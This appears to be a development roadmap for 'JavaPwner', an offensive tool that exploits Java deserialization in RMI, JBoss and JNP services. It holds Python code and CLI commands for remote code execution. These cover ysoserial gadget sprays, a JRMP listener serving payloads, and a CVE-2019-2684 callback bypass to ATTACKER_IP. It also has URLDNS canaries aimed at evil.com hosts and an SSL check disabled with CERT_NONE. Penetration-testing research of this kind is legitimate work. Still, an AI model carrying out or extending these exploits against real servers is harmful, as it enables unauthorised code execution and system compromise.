# JavaPwner — Improvements Plan

> Status: Pending
> Created: 2026-02-25
> Base: All 261 tests green (Phases A–D complete)

This document captures the technical limitations identified in the current RMI and
JBoss modules and provides a concrete implementation roadmap.

---

## Table of contents

1. [Phase E — RMI deep enumeration](#phase-e--rmi-deep-enumeration)
2. [Phase F — RMI JEP 290 bypass](#phase-f--rmi-jep-290-bypass)
3. [Phase G — JBoss extended coverage](#phase-g--jboss-extended-coverage)
4. [Phase H — Maven JVM bridge](#phase-h--maven-jvm-bridge)
5. [Phase I — ysoserial.jar deep integration](#phase-i--ysoserialjar-deep-integration)

---

## Phase E — RMI deep enumeration

### Current state

`RmiScanner.scan()` performs:
1. JRMP handshake
2. Registry `list()` call → bound names (heuristic TC_STRING scan)
3. DGC JEP 290 probe

What is **missing**:
- `lookup()` per bound name → stub bytes → class name / serialized `RemoteRef`
- Extraction of the embedded `TCPEndpoint` from the stub (real listen host:port)
- Method signature guessing on each bound object
- TC_REFERENCE / TC_LONGSTRING cases in the heuristic parser
- ObjID encoding bug (`int32` used in `scanner.py` and `exploiter.py` instead of `int64`)

---

### E.1 — Fix ObjID encoding

**File:** `javapwner/protocols/rmi/scanner.py` and `exploiter.py`

**Problem:** `_build_dgc_dirty_call()` (scanner) and `exploit_dgc()` (exploiter) build
the DGC ObjID as `struct.pack(">i", 2)` (4 bytes) followed by 16 zero bytes — 20 bytes
total but `objNum` must be `int64` (8 bytes) per the JDK source.

The correct layout:
```
objNum   : int64  (8 bytes) — e.g. 2 for DGC
uid.unique: int16  (2 bytes) — 0
uid.time  : int64  (8 bytes) — 0
uid.count : int16  (2 bytes) — 0
```

**Fix:** Replace `struct.pack(">i", 2) + b"\x00" * 16` with
`struct.pack(">q", 2) + b"\x00" * 10` (matching `protocol.py`'s `_make_objid()`).

**Tests to update:** `test_rmi_scanner.py` and `test_rmi_exploiter.py` — verify ObjID bytes.

---

### E.2 — Registry `lookup()` per bound name

**File:** `javapwner/protocols/rmi/protocol.py` and `scanner.py`

**Goal:** After `list()`, call `lookup(name)` for each bound name. The RETURN contains
a serialized stub object whose bytes include:
- The remote class name (TC_CLASSDESC)
- An embedded `TCPEndpoint` (real listen host + port)

**Implementation:**

In `protocol.py` — `build_lookup_call(name: str) -> bytes`:
```python
# arg: java.lang.String serialized as TC_STRING
arg_stream = (
    JAVA_SERIAL_MAGIC          # AC ED 00 05
    + b"\x74"                  # TC_STRING
    + struct.pack(">H", len(name.encode()))
    + name.encode()
)
return build_registry_call(LOOKUP_HASH, arg_stream)
```

In `protocol.py` — `parse_lookup_return(data) -> dict`:
```python
# Heuristic: scan for TC_CLASSDESC (0x72) to extract class name
# Scan for TCPEndpoint pattern: host string followed by int32 port
# Return {"class_name": ..., "endpoint": {"host": ..., "port": ...}}
```

In `scanner.py` — extend `scan()`:
```python
for name in result.bound_names:
    lookup_resp = self._do_lookup(sock, name)   # reuses same connection
    class_name, ep = parse_lookup_return(lookup_resp)
    result.name_types[name] = class_name
    if ep:
        result.stub_endpoints[name] = ep
```

**New fields in `RmiScanResult`:**
```python
name_types: dict[str, str] = field(default_factory=dict)    # name → class name
stub_endpoints: dict[str, dict] = field(default_factory=dict)  # name → {host, port}
```

**Tests:** `test_rmi_scanner.py` — mock `lookup()` RETURN with known class/endpoint bytes.

---

### E.3 — Heuristic parser improvements

**File:** `javapwner/core/serialization.py` and `javapwner/protocols/rmi/protocol.py`

**Current gap:** `_extract_strings_from_return()` only handles `TC_STRING (0x74)`.
Missed cases:
- `TC_LONGSTRING (0x7C)` — 4-byte length prefix instead of 2-byte
- `TC_REFERENCE (0x71)` — back-reference to a previous object in the stream

**Fix for TC_LONGSTRING:**
```python
elif tag == 0x7C:                          # TC_LONGSTRING
    if i + 4 >= len(data): break
    slen = struct.unpack_from(">I", data, i)[0]
    i += 4
    ...
```

**Fix for TC_REFERENCE:** maintain a `handles` list during parsing; when 0x71 is seen,
read 4-byte handle index and resolve from the list.

**Tests:** `test_serialization.py` — add raw bytes fixtures covering both cases.

---

### E.4 — Method guessing

**File:** `javapwner/protocols/rmi/protocol.py` (new builder) +
new file `javapwner/protocols/rmi/guesser.py`

**Technique:** For a given bound name and known method hash (from a wordlist), send
`CALL(hash, wrong_arg_type)`. The server response reveals:
- `java.io.UnmarshalException` → method exists, wrong arguments
- `java.rmi.NoSuchObjectException` → object gone
- Connection reset / `ClassNotFoundException` → method does not exist or filtered

**Wordlist format:** a YAML/JSON file mapping interface names to method hashes:
```yaml
# resources/rmi_methods.yaml
java.rmi.registry.Registry:
  lookup: -7538657168040752697
  list: 2571371466621089378
  bind: 7583982177005850366
javax.management.MBeanServer:
  queryMBeans: <hash>
  getAttribute: <hash>
```

**New class:**
```python
class RmiMethodGuesser:
    def guess(self, host: int, port: int, bound_name: str,
              wordlist: dict[str, int]) -> list[str]:
        """Returns list of method names that provoked UnmarshalException."""
```

**CLI:**
```
javapwner rmi guess -t HOST -p 1099 --name SomeService [--wordlist FILE]
```

**Note on JEP 290:** Method guessing only works if the RMI endpoint is not fully
JEP-290-filtered. If `jep290_dgc=True`, guessing is still possible because UnmarshalException
is raised *before* deserialization — the signature probe never sends a real object.

**Tests:** `tests/test_rmi_guesser.py` — mock response bytes for each case.

---

### E.5 — CLI update

**File:** `javapwner/cli/rmi_cmds.py`

Add:
```
javapwner rmi scan  -t HOST [-p 1099]      # already exists — extend output
javapwner rmi guess -t HOST -p PORT --name NAME [--wordlist FILE]
javapwner rmi info  -t HOST [-p 1099]      # scan + lookup + guess in one shot
```

For `rmi scan`, add `--json` flag to emit `RmiScanResult.to_dict()` to stdout.

---

## Phase F — RMI JEP 290 bypass

### Background

Since JDK 8u121, deserialization filters (JEP 290) block arbitrary classes on the DGC
and Registry endpoints. The DGC whitelist allows only: `ObjID`, `UID`, `VMID`,
`Lease`, `MarshalledObject`, `InetAddress`, `String`, `Number`, and primitives.

### CVE-2019-2684 / An Trinh bypass

`UnicastRef` is in the JEP 290 whitelist (it represents a remote endpoint reference).
Sending a `UnicastRef` as argument to a Registry method forces the *server* to make an
outbound JRMP connection to an attacker-controlled listener.  The attacker's listener
sends back an unrestricted serialized payload — bypassing the server-side filter because
the server is now the *client* of that secondary connection and its deserializer applies
client-side rules (no filter).

**Attack flow:**
```
Attacker               Target JVM
  |---[Registry.lookup(UnicastRef → attacker:listener_port)]-->|
  |<--[target opens JRMP connection to attacker:listener_port]--|
  |---[send unrestricted ysoserial payload]-------------------->|
  |                                          [RCE]
```

**Applicability:** JDK 8u131–8u241 (patched in 8u242 / 11.0.6).

---

### F.1 — JRMP Listener

**New file:** `javapwner/protocols/rmi/listener.py`

```python
class JrmpListener:
    """Minimal JRMP listener that serves a single ysoserial payload."""

    def __init__(self, bind_host: str = "0.0.0.0", bind_port: int = 0):
        self.bind_host = bind_host
        self.bind_port = bind_port   # 0 = OS picks a free port
        self._sock: socket.socket | None = None
        self.actual_port: int = 0

    def start(self) -> int:
        """Bind, return the actual port chosen."""

    def serve_once(self, payload_bytes: bytes, timeout: float = 10.0) -> bool:
        """Accept one connection, complete JRMP handshake, send payload."""

    def stop(self) -> None: ...
```

Handshake on the listener side:
1. Accept connection
2. Read client JRMP header (`4A 52 4D 49 00 02`)
3. Send `ProtocolAck (0x4E)` + endpoint bytes (host length + host + port as int16)
4. Read client `StreamProtocol` ack
5. Send `RETURN (0x51)` + `TC_EXCEPTION` wrapping the ysoserial payload
   (the server deserializes the "return value" of the faked remote call)

**ysoserial integration:** The `payload_bytes` served by `serve_once()` should be
produced by `YsoserialWrapper.generate()`. Additionally, ysoserial's built-in
`JRMPListener` mode (`java -cp ysoserial.jar ysoserial.exploit.JRMPListener <port>
<gadget> '<cmd>'`) can be used as a **fallback** implementation — see Phase I.3.

**Tests:** `tests/test_rmi_listener.py` — mock socket to verify handshake bytes.

---

### F.2 — UnicastRef builder

**File:** `javapwner/protocols/rmi/protocol.py`

```python
def build_unicastref_arg(host: str, port: int) -> bytes:
    """
    Serialize a UnicastRef pointing to (host, port) as an ObjectOutputStream arg.
    Used for the CVE-2019-2684 bypass.

    Wire format (simplified RemoteObject serialization):
      TC_OBJECT + TC_CLASSDESC("sun.rmi.server.UnicastRef") + ...
    """
```

The exact byte sequence can be extracted from a real JVM or from existing public PoC
code (e.g., ysoserial's `JRMPClient` gadget or `rmg`'s UnicastRef builder).

---

### F.3 — Bypass exploiter

**File:** `javapwner/protocols/rmi/exploiter.py` — add method:

```python
def exploit_jep290_bypass(
    self,
    host: str,
    port: int,
    payload_bytes: bytes,
    listener_host: str,
    listener_port: int | None = None,
) -> RmiExploitResult:
    """
    CVE-2019-2684: start JRMP listener, send UnicastRef via Registry.lookup(),
    serve payload on callback.
    """
    listener = JrmpListener(bind_host=listener_host, bind_port=listener_port or 0)
    actual_port = listener.start()
    # send Registry.lookup(UnicastRef{listener_host, actual_port})
    ...
    ok = listener.serve_once(payload_bytes, timeout=self.timeout)
    listener.stop()
    return RmiExploitResult(sent=True, likely_success=ok)
```

**CLI:**
```
javapwner rmi exploit -t HOST -p 1099 --gadget CC6 --cmd 'id' \
          --method jep290-bypass --lhost ATTACKER_IP [--lport 4444]
```

**Tests:** `tests/test_rmi_exploiter.py` — mock listener + socket; verify payload delivery.

---

## Phase G — JBoss extended coverage

### Current state

`JBossScanner` performs:
1. HTTP fingerprint (banner + invoker path probing)
2. Binary Remoting 2 probe (magic `77 01 16 79` detection)
3. HTTP invoker enumeration → CVE attribution

What is **missing**:
- HTTPS support
- JBoss Remoting 2 exploitation (detected but not exploited)
- JBoss Remoting 3 / EAP 6+ (completely absent)
- JNP / JNDI enumeration (port 4444 — JBoss 4.x/5.x)
- Authentication detection (are invoker paths auth-protected?)
- EAP vs Community fingerprinting (version string parsing is rough)
- No `--json` output on `jboss scan`

---

### G.1 — HTTPS support

**File:** `javapwner/protocols/jboss/fingerprint.py` and `invoker.py`

**Problem:** All HTTP calls currently use `http://`. Many production JBoss/WildFly
instances run on 443 or 8443 with TLS.

**Fix:** Accept a `scheme: str = "http"` parameter in `HttpInvoker` and
`JBossFingerprinter`. Auto-detect: if `port in {443, 8443}`, default `scheme="https"`.

```python
class HttpInvoker:
    def __init__(self, timeout: float = 5.0, scheme: str = "http",
                 verify_ssl: bool = False): ...
```

For `verify_ssl=False`, use `urllib.request` with a custom `ssl.SSLContext`:
```python
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
urllib.request.urlopen(req, context=ctx, timeout=self.timeout)
```

**CLI:**
```
javapwner jboss scan -t HOST -p 8443 --https
```

**Tests:** Mock `urllib.request.urlopen`; verify `https://` in constructed URL.

---

### G.2 — EAP vs Community fingerprinting

**File:** `javapwner/protocols/jboss/fingerprint.py`

**Problem:** `_extract_version()` uses rough regex. It does not distinguish:
- JBoss AS 4.x / 5.x / 6.x (community, EOL)
- JBoss EAP 4.x / 5.x / 6.x / 7.x (Red Hat, may have paid patches)
- WildFly 8–30+ (community successor)

**Improvement:** Add `edition: str | None` to `JBossFingerprint`:
```python
@dataclass
class JBossFingerprint:
    ...
    edition: str | None = None   # "AS", "EAP", "WildFly", "JBoss Web"
```

Extended regex patterns:
```python
_VERSION_PATTERNS = [
    (re.compile(r"JBoss EAP[/ ](\d+\.\d+)", re.I), "EAP"),
    (re.compile(r"WildFly[/ ](\d+)", re.I),         "WildFly"),
    (re.compile(r"JBoss[/ ]AS[/ ]?(\d+\.\d+)", re.I), "AS"),
    (re.compile(r"JBoss[^/]*?(\d+\.\d+)", re.I),    "AS"),
]
```

Also probe `GET /management` (HTTP 401 with `WWW-Authenticate: Digest` = EAP/WildFly
management interface) and `GET /jmx-console` (200 = JBoss AS 4.x/5.x community).

**Tests:** `test_jboss_fingerprint.py` — add fixtures for EAP / WildFly banners.

---

### G.3 — Authentication detection

**File:** `javapwner/protocols/jboss/fingerprint.py`

**Goal:** Determine whether invoker paths are protected by HTTP Basic / Digest auth.

`_probe_invoker_paths()` currently treats HTTP 401 / 403 as "not present". Instead:

```python
@dataclass
class InvokerPathProbe:
    path: str
    present: bool      # True if endpoint exists (200/400/415/500 or 401/403)
    auth_required: bool  # True if HTTP 401 or 403
    auth_scheme: str | None  # "Basic", "Digest", or None
```

Return `list[InvokerPathProbe]` from `_probe_invoker_paths()` instead of `list[str]`.

**Impact on scanner:** `JBossScanResult` gets:
```python
protected_endpoints: list[str]   # paths with auth_required=True
```

**Tests:** Mock urllib with HTTP 401 + `WWW-Authenticate: Digest realm="..."` header.

---

### G.4 — JBoss Remoting 2 exploitation

**File:** `javapwner/protocols/jboss/remoting.py` (new)

**Background:** JBoss Remoting 2 is a binary framing protocol used by:
- JBoss Messaging (JBoss AS 4.x/5.x)
- JBoss MQ
- Port 4446 (default Remoting connector)

The protocol wraps serialized Java objects in a custom framing layer. A vulnerable
endpoint will deserialize the payload body without filtering.

**Wire format (simplified):**
```
GREETING    : 77 01 16 79 [version: uint16] [flags: uint16]
INVOCATION  : [length: uint32] [serialized JBoss InvocationRequest]
```

**New class:**
```python
class JBossRemoting2Exploiter:
    def exploit(self, host: str, port: int, payload_bytes: bytes,
                version: int = 0x0001) -> RemotingExploitResult: ...
```

The payload is wrapped in a minimal `org.jboss.remoting.InvocationRequest` structure
(serialized with `TC_OBJECT`), sent over TCP after the GREETING exchange.

**ysoserial integration:** The inner gadget chain payload is generated by
`YsoserialWrapper.generate(gadget, command)` — the same flow as HTTP invoker
exploitation. Recommended gadgets for Remoting 2 targets:
- `CommonsCollections1` — JBoss AS 4.x/5.x (commons-collections 3.x on classpath)
- `CommonsCollections6` — JBoss AS 6.x (commons-collections 4.x)
- `MozillaRhino1` — JBoss 4.x bundled Rhino engine

**CLI:**
```
javapwner jboss exploit -t HOST -p 4446 --gadget CC6 --cmd 'id' --proto remoting2
```

**Tests:** Mock socket; verify framing bytes.

---

### G.5 — JNP / JNDI enumeration

**File:** `javapwner/protocols/jboss/jnp.py` (new)

**Background:** JNP (Java Naming Provider) is JBoss's proprietary JNDI protocol.
It runs on port 4444 (JBoss AS 4.x/5.x default) and exposes all bound JNDI names
(EJBs, DataSources, JMS queues, etc.).

**Protocol:** JNP uses Java serialization over TCP. The client sends a lookup request;
the server responds with the JNDI tree or a serialized stub.

**New class:**
```python
@dataclass
class JnpScanResult:
    host: str
    port: int
    is_open: bool = False
    is_jnp: bool = False
    bound_names: list[str] = field(default_factory=list)
    error: str | None = None

class JnpScanner:
    DEFAULT_PORT = 4444

    def scan(self, host: str, port: int) -> JnpScanResult:
        """
        1. TCP connect
        2. Send JNP lookup request for "" (root context)
        3. Heuristic parse of RETURN → extract TC_STRING bound names
        """
```

**JNP request format:**
```
[int32 version=0x4A4E5030]  # magic "JNP0"
[int32 flags=0x00000001]    # LIST flag
[java serialized NamingContext request]
```

**ysoserial integration:** JNP deserializes the `NamingContext` request body.
A ysoserial payload can be sent in place of the legitimate request to achieve
RCE (same technique as CVE-2015-7501 but over the JNP TCP protocol). Add an
exploit mode alongside enumeration:
```python
class JnpExploiter:
    def exploit(self, host: str, port: int, payload_bytes: bytes) -> JnpExploitResult:
        """Send a ysoserial payload wrapped as a JNP request."""
```

**CLI:**
```
javapwner jboss jnp-scan -t HOST [-p 4444]
javapwner jboss jnp-exploit -t HOST [-p 4444] --gadget CC1 --cmd 'id'
```

**Tests:** `tests/test_jboss_jnp.py` — mock socket with fixture JNDI response bytes.

---

### G.6 — JBoss Remoting 3 / EAP 6+ support

**File:** `javapwner/protocols/jboss/remoting3.py` (new)

**Background:** JBoss EAP 6.x and WildFly 8+ use Remoting 3 (JBoss Remoting 3.x),
which supersedes Remoting 2. It runs on port 4447 (EAP 6) or 8080/443 via HTTP Upgrade.

**Fingerprint:** Remoting 3 greeting:
```
[version: uint8 = 0x00] [capabilities: variable]
```
The server responds to a `GREETING` with its supported version range.

**Exploitation:** Remoting 3 frames JBoss Remoting invocations over a multiplexed
channel. Exploit delivery is more complex than Remoting 2 — requires:
1. Channel negotiation (CAPABILITY exchange)
2. `OPEN_CHANNEL` request
3. Framed `MESSAGE` containing serialized payload

**Scope for this phase:** Detection only (not exploitation):
```python
class JBossRemoting3Fingerprinter:
    def probe(self, host: str, port: int) -> bool:
        """Return True if endpoint speaks Remoting 3."""
```

Extend `JBossProtocol` enum:
```python
class JBossProtocol(Enum):
    ...
    REMOTING3 = "jboss_remoting3"
    MANAGEMENT = "management"   # HTTP management API (EAP 7 / WildFly)
```

Extend `JBossFingerprinter` to probe ports 4447 and 8080 (HTTP Upgrade header).

**Tests:** Mock socket returning Remoting 3 greeting bytes.

---

### G.7 — CLI updates

**File:** `javapwner/cli/jboss_cmds.py`

```
javapwner jboss scan    -t HOST [-p 8080] [--https] [--json]
javapwner jboss exploit -t HOST -p PORT --gadget CC6 --cmd 'id'
                        [--proto http|remoting2] [--path /invoker/...]
javapwner jboss jnp-scan -t HOST [-p 4444]
javapwner jboss info    -t HOST [-p 8080]   # scan + jnp + remoting + fingerprint
```

---

## Phase H — Maven JVM bridge

### Current state

`JvmBridge` in `javapwner/core/jvm_bridge.py` works by:
1. Discovering JARs via glob patterns in `lib/`
2. Building a classpath string
3. Shelling out to `java -cp <classpath> <MainClass>`

**Problems:**
- JAR files must be manually copied to `lib/`
- No dependency management (no transitive deps)
- Fragile glob patterns
- Different JVM versions may require recompilation of `lib/` stubs

### H.1 — Fat JAR via Maven Shade

**New file:** `lib/pom.xml` (Maven project)

Dependencies to bundle (example for `jini-bridge`):
```xml
<dependencies>
  <dependency>
    <groupId>org.apache.river</groupId>
    <artifactId>river-jini</artifactId>
    <version>3.0.0</version>
  </dependency>
</dependencies>
```

Build:
```bash
cd lib && mvn package -q
# Produces: lib/target/javapwner-bridge-1.0-SNAPSHOT-fat.jar
```

**New file:** `lib/src/main/java/com/javapwner/Bridge.java`
(consolidates all bridge entry points into one fat JAR with a dispatch main)

### H.2 — Update `JvmBridge`

**File:** `javapwner/core/jvm_bridge.py`

Replace JAR discovery logic with:
```python
_FAT_JAR = Path(__file__).parent.parent.parent / "lib" / "target" / "javapwner-bridge-*-fat.jar"

def _find_jar(self) -> Path:
    matches = sorted(_FAT_JAR.parent.glob(_FAT_JAR.name))
    if not matches:
        raise RuntimeError(
            "Fat JAR not found. Run: cd lib && mvn package"
        )
    return matches[-1]
```

Remove `_discover_jars()` and the `lib/` glob approach entirely.

### H.3 — CI integration

Add to `pyproject.toml` or `Makefile`:
```makefile
.PHONY: build-jar
build-jar:
    cd lib && mvn package -q -DskipTests

test: build-jar
    .venv/bin/pytest tests/ --ignore=tests/integration
```

**Tests:** `test_jvm_bridge.py` — mock `subprocess.run`; verify fat JAR path is passed.

---

## Phase I — ysoserial.jar deep integration

### Current state

`YsoserialWrapper` in `javapwner/core/payload.py` provides a thin subprocess wrapper
around `ysoserial-all.jar`. It supports:
- `generate(gadget, command)` → raw payload bytes
- `generate_urldns(url)` → URLDNS gadget shortcut
- `list_gadgets()` / `validate_gadget()` — introspection via stderr parsing

All three exploit modules (`JiniExploiter`, `RmiExploiter`, `HttpInvoker`) already
consume `YsoserialWrapper` for payload generation.

**What is missing / can be improved:**
- No use of ysoserial's **built-in exploit modes** (`JRMPListener`, `JRMPClient`,
  `RMIRegistryExploit`) which handle complete attack flows out of the box
- No **payload caching** — repeated calls for the same gadget/command spawn a new
  JVM each time
- No **multi-gadget spray** — scanning often needs to test several gadget chains
- No `ysoserial-modified` / `ysoserial-all` fork support (extended gadget chains)
- Gadget list parsing from ysoserial stderr is fragile (regex-based)
- No JRMP-specific payload wrappers (`JRMPClient` gadget for UnicastRef injection)

---

### I.1 — ysoserial exploit modes wrapper

**File:** `javapwner/core/payload.py` — extend `YsoserialWrapper`

**Background:** Beyond generating raw payload bytes, ysoserial ships with built-in
exploit runners in the `ysoserial.exploit` package:

| Mode | Class | Description |
|------|-------|-------------|
| `JRMPListener` | `ysoserial.exploit.JRMPListener` | Opens a JRMP listener that serves a payload to any connecting JVM |
| `JRMPClient` | `ysoserial.exploit.JRMPClient` | Sends a serialized payload to a JRMP endpoint |
| `RMIRegistryExploit` | `ysoserial.exploit.RMIRegistryExploit` | Binds a poisoned object to an RMI registry |

These modes replace hand-crafted protocol code with battle-tested Java implementations.

**Implementation:**

```python
class YsoserialWrapper:
    # ... existing methods ...

    def run_jrmp_listener(
        self, port: int, gadget: str, command: str,
        timeout: float = 30.0,
    ) -> subprocess.Popen:
        """Start ysoserial's built-in JRMP listener.

        Returns a Popen handle so the caller can stop it after the attack.

        Usage: serves a ysoserial payload to any JVM that connects back
        (e.g. CVE-2019-2684 / UnicastRef redirect).
        """
        proc = subprocess.Popen(
            ["java", "-cp", str(self._jar),
             "ysoserial.exploit.JRMPListener", str(port), gadget, command],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE,
        )
        return proc

    def run_jrmp_client(
        self, host: str, port: int, gadget: str, command: str,
    ) -> bytes:
        """Send a ysoserial payload to a JRMP endpoint using ysoserial's
        built-in JRMPClient.

        This is an alternative to the hand-crafted DGC dirty() call in
        RmiExploiter.exploit_dgc() / JiniExploiter.exploit().  It handles
        the full JRMP handshake in Java, which is more robust against
        edge-case JRMP implementations.
        """
        result = subprocess.run(
            ["java", "-cp", str(self._jar),
             "ysoserial.exploit.JRMPClient", host, str(port), gadget, command],
            capture_output=True, timeout=30,
        )
        return result.stdout + result.stderr

    def run_rmi_registry_exploit(
        self, host: str, port: int, gadget: str, command: str,
    ) -> bytes:
        """Exploit an RMI registry by binding a poisoned object.

        Alternative to RmiExploiter.exploit_registry() — the Java-side
        implementation correctly handles all RMI protocol negotiation.
        """
        result = subprocess.run(
            ["java", "-cp", str(self._jar),
             "ysoserial.exploit.RMIRegistryExploit",
             host, str(port), gadget, command],
            capture_output=True, timeout=30,
        )
        return result.stdout + result.stderr
```

**Integration with Phase F:** `exploit_jep290_bypass()` can use
`run_jrmp_listener()` instead of the custom `JrmpListener` class. This provides
a fallback if the pure-Python JRMP listener (F.1) encounters edge-case
handshakes that the hand-crafted implementation cannot handle.

**Tests:** `tests/test_payload.py` — mock `subprocess.Popen`/`subprocess.run`;
verify correct command-line arguments for each exploit mode.

---

### I.2 — Payload caching

**File:** `javapwner/core/payload.py`

**Problem:** Every call to `generate(gadget, command)` spawns a new JVM process.
During a multi-gadget spray (I.4) or repeated exploitation attempts, this adds
significant latency (~2–5s per invocation).

**Fix:** Add an in-memory LRU cache keyed on `(gadget, command)`:

```python
from functools import lru_cache

class YsoserialWrapper:
    # ...

    @lru_cache(maxsize=64)
    def _generate_cached(self, gadget: str, command: str) -> bytes:
        """Cache payloads since the same gadget+command always produces
        identical bytes (ysoserial is deterministic for most gadgets)."""
        return self._generate_uncached(gadget, command)

    def generate(self, gadget: str, command: str) -> bytes:
        return self._generate_cached(gadget, command)
```

**Note:** URLDNS is *not* deterministic (it resolves the DNS name at generation
time). Exclude it from cache or use a separate path.

**Tests:** Verify that two calls with the same args invoke `subprocess.run` only once.

---

### I.3 — JRMPClient gadget for UnicastRef injection (Phase F support)

**File:** `javapwner/core/payload.py`

**Background:** ysoserial provides a `JRMPClient` **gadget** (distinct from the
`JRMPClient` exploit mode). This gadget, when deserialized, makes the target JVM
open an outbound JRMP connection to an attacker-controlled host — exactly the
mechanism needed for the CVE-2019-2684 bypass (Phase F).

**Use case:** Instead of manually serializing a `UnicastRef` in Python (Phase F.2),
generate it via ysoserial:

```python
def generate_jrmp_client_gadget(self, listener_host: str, listener_port: int) -> bytes:
    """Generate a JRMPClient gadget payload.

    When deserialized by the target, it opens a JRMP connection back to
    listener_host:listener_port, where a JRMP listener (I.1 or F.1)
    serves the real exploitation payload.
    """
    return self.generate("JRMPClient", f"{listener_host}:{listener_port}")
```

**Impact on Phase F.2:** The hand-crafted `build_unicastref_arg()` becomes
optional. The ysoserial-generated `JRMPClient` gadget is more reliable because
it is produced by a real `ObjectOutputStream` in the JVM, avoiding subtle
serialization mistakes in the Python byte builder.

**Attack flow using ysoserial throughout:**
```
1. YsoserialWrapper.run_jrmp_listener(port, gadget, cmd)  → starts listener
2. YsoserialWrapper.generate_jrmp_client_gadget(lhost, lport) → payload bytes
3. Send payload via Registry.bind() / lookup() / DGC dirty()
4. Target deserializes JRMPClient → connects back to listener
5. Listener serves the real gadget chain → RCE
```

**Tests:** `tests/test_payload.py` — verify the generated payload starts with
Java serialization magic (`AC ED 00 05`) and contains the listener host string.

---

### I.4 — Multi-gadget spray

**File:** `javapwner/core/payload.py` (new method) + `javapwner/protocols/rmi/exploiter.py`
+ `javapwner/protocols/jboss/invoker.py`

**Goal:** During exploitation, the operator often does not know which gadget chain
will work against the target. A spray mode tries multiple gadgets in sequence.

**Implementation:**

```python
# In YsoserialWrapper
_COMMON_GADGETS = [
    "CommonsCollections6",
    "CommonsCollections1",
    "CommonsCollections5",
    "CommonsCollections7",
    "Jdk7u21",
    "MozillaRhino1",
    "Spring1",
    "Groovy1",
    "Hibernate1",
]

def generate_spray(self, command: str,
                   gadgets: list[str] | None = None) -> list[tuple[str, bytes]]:
    """Generate payloads for multiple gadget chains.

    Returns a list of (gadget_name, payload_bytes) for all gadgets that
    ysoserial successfully generated. Skips gadgets that fail (missing
    dependency JARs inside ysoserial).
    """
    targets = gadgets or _COMMON_GADGETS
    results = []
    for g in targets:
        try:
            payload = self.generate(g, command)
            results.append((g, payload))
        except PayloadError:
            continue  # gadget not available in this ysoserial build
    return results
```

In `RmiExploiter` and `HttpInvoker`, add a `spray()` method:
```python
def spray(
    self, host: str, port: int, command: str,
    gadgets: list[str] | None = None, via: str = "dgc",
) -> list[RmiExploitResult]:
    """Try each gadget chain; return results for all attempts."""
    payloads = self._ysoserial.generate_spray(command, gadgets)
    results = []
    for gadget_name, payload in payloads:
        r = self.exploit_dgc(host, port, payload) if via == "dgc" \
            else self.exploit_registry(host, port, payload)
        r.gadget = gadget_name
        results.append(r)
        if r.likely_success:
            break       # stop on first success
    return results
```

**CLI:**
```
javapwner rmi exploit -t HOST -p 1099 --cmd 'id' --spray
javapwner jboss exploit -t HOST -p 8080 --cmd 'id' --spray
```

**Tests:** `tests/test_payload.py` — mock ysoserial; verify spray skips failing gadgets.
`tests/test_rmi_exploiter.py` — verify spray stops on first `likely_success`.

---

### I.5 — ysoserial-modified / ysoserial-all fork support

**File:** `javapwner/core/payload.py`

**Background:** Several community forks of ysoserial exist with additional gadget
chains and exploit modes:

| Fork | Extra gadgets |
|------|---------------|
| `ysoserial-modified` (pwntester) | `JBossInterceptors`, `JavassistWeld`, `Wicket1`, etc. |
| `ysoserial-all` (frohoff) | Extended collection with latest chains |
| `marshalsec` (mbechler) | Different focus (non-Java serialization: JNDI, LDAP, etc.) |

**Implementation:** Make `YsoserialWrapper` fork-aware:

```python
class YsoserialWrapper:
    def __init__(self, jar_path: str | Path | None = None,
                 fork: str = "standard"):
        """...
        fork: "standard", "modified", or "all" — affects gadget list
              parsing and exploit class paths.
        """
        self._fork = fork
        # ...

    def _exploit_class(self, mode: str) -> str:
        """Return the fully-qualified exploit class for the given mode."""
        if self._fork == "modified":
            return f"ysoserial.exploit.{mode}"  # same namespace
        return f"ysoserial.exploit.{mode}"
```

The main benefit is that `list_gadgets()` and `validate_gadget()` correctly
parse the fork's output format (which may differ slightly from standard ysoserial).

**CLI:**
```
javapwner --ysoserial-jar /path/to/ysoserial-modified.jar rmi exploit ...
```

(Already supported via `--ysoserial` global option — this phase ensures
compatibility with non-standard output formats.)

**Tests:** `tests/test_payload.py` — fixture with ysoserial-modified stderr output;
verify `list_gadgets()` extracts the extended chain names.

---

### I.6 — URLDNS ysoserial probe for deserialization detection

**File:** `javapwner/protocols/rmi/scanner.py` + `javapwner/protocols/jboss/scanner.py`

**Background:** The `URLDNS` ysoserial gadget triggers a DNS lookup when
deserialized. It requires **no gadget libraries** on the target classpath — it
uses only `java.net.URL` (always available). This makes it the ideal
**detection canary** for blind deserialization vulnerabilities.

**Current state:** `JiniExploiter` already supports `--jep290-probe` with
`generate_urldns()`. This capability should be extended to RMI and JBoss modules.

**Implementation:**

In `RmiScanner.scan()`, add an optional URLDNS probe:
```python
def scan(self, host: str, port: int, *,
         urldns_canary: str | None = None) -> RmiScanResult:
    """...
    urldns_canary: if provided (e.g. 'rmi-{rand}.attacker.com'),
                   send a URLDNS payload via DGC dirty() to detect
                   blind deserialization. Check DNS logs for resolution.
    """
    # ... existing scan logic ...
    if urldns_canary:
        payload = YsoserialWrapper().generate_urldns(urldns_canary)
        self._send_dgc_dirty(sock, payload)
        result.urldns_sent = True
        result.urldns_canary = urldns_canary
```

In `JBossScanner.scan()`, add URLDNS probe via HTTP invoker:
```python
if urldns_canary:
    payload = YsoserialWrapper().generate_urldns(urldns_canary)
    for path in active_invoker_paths:
        invoker.exploit(host, port, payload, path=path)
    result.urldns_sent = True
```

**CLI:**
```
javapwner rmi scan -t HOST -p 1099 --urldns 'rmi-test.evil.com'
javapwner jboss scan -t HOST -p 8080 --urldns 'jboss-test.evil.com'
```

**Tests:** Verify URLDNS payload is generated and sent through the correct
delivery vector. Mock `YsoserialWrapper.generate_urldns()`.

---

### I.7 — CLI global option & documentation

**File:** `javapwner/cli/main.py`

**Current state:** The `--ysoserial` global option already exists. Improvements:

1. Add `--ysoserial-check` flag that validates ysoserial is reachable and lists
   available gadgets:
   ```
   javapwner --ysoserial-check
   ```
   Output:
   ```
   ysoserial.jar: /home/user/lib/ysoserial-all.jar
   Java:          /usr/bin/java (openjdk 11.0.20)
   Gadgets:       43 available
     CommonsCollections1, CommonsCollections2, ...
   ```

2. Add `--spray` as a shared option for all `exploit` subcommands.

3. Document ysoserial setup in `README.md`:
   - Download link (`https://github.com/frohoff/ysoserial/releases`)
   - Placement: `lib/ysoserial.jar` or `YSOSERIAL_PATH` env var
